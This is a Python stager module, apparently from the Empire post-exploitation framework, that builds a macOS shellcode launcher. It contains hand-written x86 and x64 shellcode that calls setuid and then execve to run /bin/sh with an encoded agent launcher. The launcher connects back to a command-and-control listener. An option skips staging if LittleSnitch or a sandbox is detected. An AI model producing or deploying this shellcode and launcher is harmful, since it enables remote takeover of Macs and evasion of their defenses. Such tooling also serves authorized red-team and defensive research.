from empire.server.common import helpers


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "Shellcode launcher",
            "Authors": [
                {
                    "Name": "",
                    "Handle": "@johneiser",
                    "Link": "",
                },
            ],
            "Description": "Generate an osx shellcode launcher",
            "Comments": ["Shellcode contains NULL bytes, may need to be encoded."],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "python",
                "SuggestedValues": ["python"],
                "Strict": True,
            },
            "Architecture": {
                "Description": "Architecture: x86/x64",
                "Required": True,
                "Value": "x64",
                "SuggestedValues": ["x64", "x86"],
                "Strict": True,
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": True,
                "Value": "launcher.bin",
            },
            "SafeChecks": {
                "Description": "Checks for LittleSnitch or a SandBox, exit the staging process if true. "
                "Defaults to True.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

    def generate(self):
        # extract all of our options
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        arch = self.options["Architecture"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        safe_checks = self.options["SafeChecks"]["Value"]

        if not self.mainMenu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            print(helpers.color("[!] Invalid listener: " + listener_name))
            return ""

        # generate launcher code
        launcher = self.mainMenu.stagergenv2.generate_launcher(
            listener_name=listener_name,
            language=language,
            encode=True,
            user_agent=user_agent,
            safe_checks=safe_checks,
        )
        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""
        if arch.lower() == "x86":
            sc = (
                # 0x17: int setuid(uid_t uid)
                "\x31\xdb"  # xor ebx, ebx          ; Zero out ebx
                "\x53"  # push ebx              ; Set uid_t uid (NULL)
                "\x53"  # push ebx              ; Align stack (8)
                "\x31\xc0"  # xor eax, eax          ; Zero out eax
                "\xb0\x17"  # mov al, 0x17          ; Prepare sys_setuid
                "\xcd\x80"  # int 0x80              ; Call sys_setuid
                "\x83\xc4\x08"  # add esp, 8            ; Fix stack (args)
                # 0x3b: int execve(const char *path, char *const argv[], char *const envp[])
                "\x53"  # push ebx              ; Terminate pointer array
                "\xeb\x2c"  # jmp get_payload       ; Retrieve pointer to payload
                # got_payload:
                "\xe8\x03\x00\x00\x00"  # call cmd_get_param_1  ; Push pointer to "-c", 0x00
                "\x2d\x63\x00"  # db "-c", 0x00
                # cmd_get_param_1:
                "\xe8\x08\x00\x00\x00"  # call cmd_get_param_0  ; Push pointer to "/bin/sh", 0x00
                "\x2f\x62\x69\x6e"  # db "/bin"
                "\x2f\x73\x68\x00"  # db "/sh", 0x00
                # cmd_get_param_0:
                "\x8b\x0c\x24"  # mov ecx, [esp]        ; Save pointer to "/bin/sh", 0x00
                "\x89\xe2"  # mov edx, esp          ; Prepare args
                "\x53"  # push ebx              ; Set char *const envp[] (NULL)
                "\x52"  # push edx              ; Set char *const argv[] ({"/bin/sh", "-c", cmd, NULL})
                "\x51"  # push ecx              ; Set const char *path ("/bin/sh", 0x00)
                "\x53"  # push ebx              ; Align stack (16)
                "\x31\xc0"  # xor eax, eax          ; Zero out eax
                "\xb0\x3b"  # mov al, 0x3b          ; Prepare sys_execve
                "\xcd\x80"  # int 0x80              ; Call sys_execve
                "\x83\xc4\x20"  # add esp, 32           ; Fix stack (args, array[4])
                # 0x01: void exit(int status)
                "\x31\xc0"  # xor eax, eax          ; Zero out eax
                "\x40"  # inc eax               ; Prepare sys_exit
                "\xcd\x80"  # int 0x80              ; Call sys_exit
                # get_payload:
                "\xe8\xcf\xff\xff\xff"  # call got_payload      ; Push pointer to payload
            )
        else:
            sc = (
                # 0x2000017: int setuid(uid_t uid)
                "\x48\x31\xff"  # xor rdi, rdi          ; Set uid_t uid (NULL)
                "\x48\xc7\xc0\x17\x00\x00\x02"  # mov rax, 0x2000017    ; Prepare sys_setuid
                "\x0f\x05"  # syscall               ; Call sys_setuid
                # 0x200003b: int execve(const char *path, char *const argv[], char *const envp[])
                "\x48\x31\xd2"  # xor rdx, rdx          ; Set char *const envp[] (NULL)
                "\x52"  # push rdx              ; Terminate pointer array
                "\xeb\x32"  # jmp get_payload       ; Retrieve pointer to payload
                # got_payload:
                "\xe8\x03\x00\x00\x00"  # call cmd_get_param_1  ; Push pointer to "-c", 0x00
                "\x2d\x63\x00"  # db "-c", 0x00
                # cmd_get_param_1:
                "\xe8\x08\x00\x00\x00"  # call cmd_get_param_0  ; Push pointer to "/bin/sh", 0x00
                "\x2f\x62\x69\x6e"  # db "/bin"
                "\x2f\x73\x68\x00"  # db "/sh", 0x00
                # cmd_get_param_0:
                "\x48\x8b\x3c\x24"  # mov rdi, [rsp]        ; Set const char *path ("/bin/sh", 0x00)
                "\x48\x89\xe6"  # mov rsi, rsp          ; Set char *const argv[] ({"/bin/sh", "-c", cmd, NULL})
                "\x48\xc7\xc0\x3b\x00\x00\x02"  # mov rax, 0x200003b    ; Prepare sys_execve
                "\x0f\x05"  # syscall               ; Call sys_execve
                "\x48\x83\xc4\x20"  # add rsp, 32           ; Fix stack (array[4])
                # 0x2000001: void exit(int status)
                "\x48\xc7\xc0\x01\x00\x00\x02"  # mov rax, 0x2000001    ; Prepare sys_exit
                "\x0f\x05"  # syscall               ; Call sys_exit
                # get_payload:
                "\xe8\xc9\xff\xff\xff"  # call got_payload      ; Push pointer to payload
            )
        return sc + launcher + "\x00"
